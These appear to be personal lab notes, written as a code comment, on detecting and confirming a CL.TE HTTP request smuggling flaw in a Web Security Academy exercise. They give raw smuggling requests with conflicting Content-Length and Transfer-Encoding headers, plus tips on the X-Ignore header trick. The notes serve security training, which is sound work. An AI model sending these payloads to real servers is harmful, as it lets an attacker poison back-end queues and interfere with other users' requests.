/*

a) Detection


1) If the front end supports CL and the back end supports TE, then,
    using timeout technique

//  change to post, update content length- turnoff, show non printable chars, switch to hTTP 1

POST / HTTP/1.1
Host: 0a490048031d8910806eb70d00100006.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

// timeout

---------------------------------------------------------------------------------

b) Confirmation

1) differential requests, attacker and normal
// attackrequest
POST / HTTP/1.1
Host: 0a490048031d8910806eb70d00100006.web-security-academy.net
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X

// normal request
GET / HTTP/1.1
Host: 0a490048031d8910806eb70d00100006.web-security-academy.net
Cookie: session=BCeeqS8YUBUQvgU0MBNtkb3MK3D9M30S
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*
Connection: close

// X-ignore is not a standard header, we get 400 not the 404 we desire
    to avoid the newline in the conjunction of the poison and the normal request
    to avoid invalid request error

    prevent the GET request method from the normal request from being on the next line, 
    as that would cause an invalid request error due to the double request method in
    the request on separate lines.
    You can pretty much pick any name instead of X-Ignore

*/